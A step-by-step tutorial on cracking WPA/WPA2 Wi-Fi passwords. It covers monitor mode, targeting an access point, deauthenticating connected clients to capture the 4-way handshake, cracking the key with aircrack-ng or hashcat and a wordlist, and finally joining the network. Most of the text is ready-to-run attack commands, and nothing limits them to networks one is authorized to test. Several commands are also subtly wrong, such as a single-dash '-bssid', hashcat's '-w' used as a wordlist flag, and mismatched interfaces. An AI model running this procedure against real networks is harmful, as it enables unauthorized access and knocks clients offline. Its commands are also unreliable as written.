## Cracking WPA/WPA2 with Handshake Capture[](#cracking-wpa-wpa2-with-handshake-capture)

In this tutorial, we'll demonstrate how to crack WPA/WPA2 encrypted networks by capturing the 4-way handshake and then using tools like `aircrack-ng` and `hashcat` to crack the password.

### Prerequisites[](#prerequisites)

Ensure you have the following:

- A wireless card that supports monitor mode.
- The necessary tools: `airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`, `hashcat`.
- A wordlist (e.g., `/usr/share/wordlists/rockyou.txt`).

### Step-by-Step Process[](#step-by-step-process)

#### 1. **Start Interface in Monitor Mode and Kill Unwanted Services**[](#id-1.-start-interface-in-monitor-mode-and-kill-unwanted-services)

Start by disabling any interfering processes and putting your wireless interface into monitor mode:

```bash
airmon-ng check kill && airmon-ng start wlan0
```

- `airmon-ng check kill`: Stops interfering processes.
- `airmon-ng start wlan0`: Puts the wireless interface `wlan0` into monitor mode (`wlan0mon`).
#### 2. **Scan for Networks**[](#id-2.-scan-for-networks)

Next, scan for nearby wireless networks to identify the one you want to target:

```bash
sudo airodump-ng wlan0mon
```

#### 3. **Scan on Specific AP and Channel with Output File**[](#id-3.-scan-on-specific-ap-and-channel-with-output-file)

Once you've identified the target AP, run `airodump-ng` on the specific network to capture data:

```bash
sudo airodump-ng -bssid <BSSID> -c <Channel> -w <WPA1?> wlan0mon
```

- `<BSSID>`: The MAC address of the target AP.
- `<Channel>`: The channel number on which the AP is operating.
- `<WPA1?>`: The name of the file where you want to save the captured data.

#### 4. **De-Authenticate Clients to Capture Handshake**[](#id-4.-de-authenticate-clients-to-capture-handshake)

In order to capture the 4-way handshake, de-authenticate a connected client using `aireplay-ng`:

# Remember, you can also refer to another section for deauthenticating all clients

```bash
sudo aireplay-ng -a <BSSID> -c <Client Mac> -0 0 wlan0mon
```

- `-a <BSSID>`: The BSSID of the target AP.
- `-c <Client Mac>`: The MAC address of a client connected to the AP.
- `-0 0`: Sends deauthentication packets indefinitely until the handshake is captured.

#### 5. **Crack the WPA/WPA2 Key Using Aircrack-ng**[](#id-5.-crack-the-wpa-wpa2-key-using-aircrack-ng)

Once the handshake is captured, use `aircrack-ng` to crack the password:

```bash
sudo aircrack-ng <output_file>.cap -e <ESSID>
```

- `<output_file>.cap`: The capture file containing the handshake.
- `<ESSID>`: The name (SSID) of the target network.

You can also use a wordlist for a more efficient brute-force attack:

```bash
sudo aircrack-ng <output_file>.cap -e <ESSID> -w /usr/share/wordlists/rockyou.txt
```

#### 6. **Crack the WPA/WPA2 Key Using Hashcat**[](#id-6.-crack-the-wpa-wpa2-key-using-hashcat)

Alternatively, you can use `hashcat` for cracking the WPA/WPA2 key. First, convert the `.cap` file to a hashcat-compatible format:

```bash
hcxpcapngtool -o <output_file>.hc22000 <output_file>.cap
```

- `<output_file>.cap`: The original capture file.
- `<output_file>.hc22000`: The converted hashcat file.

Next, run `hashcat` to crack the WPA/WPA2 key:

```bash
hashcat -m 22000 <output_file>.hc22000 -w /usr/share/wordlists/rockyou.txt
```

#### 7. **Conclusion**[](#id-7.-conclusion)

Once the password is cracked, you should have access to the network. Connecting to the Network:

```bash
wpa_supplicant -c <filename>.conf -i wlan0mon
```

`<filename>.conf`: The WPA configuration file containing network details.

Request IP from DHCP Server:

```bash
sudo dhclient wlan0 -v
```

By following these steps, you'll be able to crack the WPA/WPA2 password and gain access to the network.
